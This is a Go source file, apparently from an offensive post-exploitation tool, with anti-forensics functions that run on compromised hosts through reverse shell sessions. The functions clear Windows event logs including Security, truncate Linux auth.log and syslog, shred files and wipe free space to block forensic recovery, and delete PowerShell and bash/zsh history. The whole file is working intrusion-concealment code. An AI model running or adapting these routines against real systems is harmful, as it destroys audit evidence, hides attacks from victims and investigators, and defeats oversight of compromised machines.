package ghost

import (
	"context"
	"fmt"
	"strings"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
	"github.com/0xP4X/drogonclaw-go/internal/shell"
)

// WipeEventLogs clears system audit logs on the target.
// For Windows targets, commands are sent over an active shell session (sessionID).
// For Linux targets, commands execute inside the sandbox directly.
func WipeEventLogs(ctx context.Context, osType, sessionID string, sb *sandbox.Docker) (string, error) {
	osType = strings.ToLower(osType)

	if osType == "windows" {
		s, ok := shell.GlobalShells.Get(sessionID)
		if !ok {
			return "", fmt.Errorf("session %s not found — a live Windows shell session is required for Windows log wiping", sessionID)
		}
		// wevtutil cl runs natively on the Windows target through the reverse shell
		cmd := `cmd /c "wevtutil cl System 2>nul & wevtutil cl Security 2>nul & wevtutil cl Application 2>nul & wevtutil cl Setup 2>nul & echo [+] Windows Event Logs wiped."`
		out, err := s.Send(cmd)
		if err != nil {
			return "", fmt.Errorf("failed to wipe Windows event logs: %v", err)
		}
		return fmt.Sprintf("[+] Windows Event Logs cleared via session %s.\n%s", sessionID, out), nil
	}

	// Linux: run directly in the sandbox
	cmd := `sh -c 'cat /dev/null > /var/log/auth.log 2>/dev/null; cat /dev/null > /var/log/syslog 2>/dev/null; journalctl --vacuum-time=1s 2>/dev/null; echo "[+] Linux Authentication and Syslog wiped successfully."'`
	out, err := sb.Execute(ctx, cmd)
	if err != nil {
		return "", fmt.Errorf("failed to wipe logs: %v", err)
	}
	return out, nil
}

// SecureDelete securely overwrites and deletes a file to prevent forensic recovery.
// For Windows targets, uses cipher /w (built-in secure overwrite) via live shell session.
// For Linux targets, uses shred inside the sandbox.
func SecureDelete(ctx context.Context, filePath, osType, sessionID string, sb *sandbox.Docker) (string, error) {
	osType = strings.ToLower(osType)

	if osType == "windows" {
		s, ok := shell.GlobalShells.Get(sessionID)
		if !ok {
			return "", fmt.Errorf("session %s not found — a live Windows shell session is required for Windows secure delete", sessionID)
		}
		// cipher /w performs a 3-pass DOD-style overwrite of free space in the file's directory.
		// We first delete the file, then wipe the freed space so forensic recovery is prevented.
		dir := `%TEMP%`
		if idx := strings.LastIndexAny(filePath, `/\`); idx != -1 {
			dir = filePath[:idx]
		}
		cmd := fmt.Sprintf(`cmd /c "del /f /q "%s" 2>nul & cipher /w:"%s" & echo [+] %s securely deleted (3-pass wipe)."`, filePath, dir, filePath)
		out, err := s.Send(cmd)
		if err != nil {
			return "", fmt.Errorf("secure delete failed: %v", err)
		}
		return fmt.Sprintf("[+] Secure delete complete via session %s.\n%s", sessionID, out), nil
	}

	// Linux: shred inside the sandbox
	cmd := fmt.Sprintf(`sh -c 'shred -u -z -n 3 "%s" 2>/dev/null || rm -f "%s"; echo "[+] %s securely shredded and removed."'`, filePath, filePath, filePath)
	out, err := sb.Execute(ctx, cmd)
	if err != nil {
		return "", fmt.Errorf("secure delete failed: %v", err)
	}
	return out, nil
}

// ClearShellHistory clears bash/zsh history (Linux) or PSReadLine history (Windows).
// For Windows targets, commands are sent over an active shell session (sessionID).
// For Linux targets, commands execute inside the sandbox directly.
func ClearShellHistory(ctx context.Context, osType, sessionID string, sb *sandbox.Docker) (string, error) {
	osType = strings.ToLower(osType)

	if osType == "windows" {
		s, ok := shell.GlobalShells.Get(sessionID)
		if !ok {
			return "", fmt.Errorf("session %s not found — a live Windows shell session is required for Windows history clearing", sessionID)
		}
		// Remove PSReadLine history file on the target
		cmd := `powershell -NoProfile -Command "Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; Clear-History; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null; Write-Output '[+] PowerShell history cleared.'"`
		out, err := s.Send(cmd)
		if err != nil {
			return "", fmt.Errorf("history clear failed: %v", err)
		}
		return fmt.Sprintf("[+] Windows shell history cleared via session %s.\n%s", sessionID, out), nil
	}

	// Linux: clear history inside the sandbox
	cmd := `sh -c 'unset HISTFILE; rm -f ~/.bash_history ~/.zsh_history ~/.sh_history; history -c 2>/dev/null; echo "[+] Linux shell history sanitized."'`
	out, err := sb.Execute(ctx, cmd)
	if err != nil {
		return "", fmt.Errorf("history clear failed: %v", err)
	}
	return out, nil
}
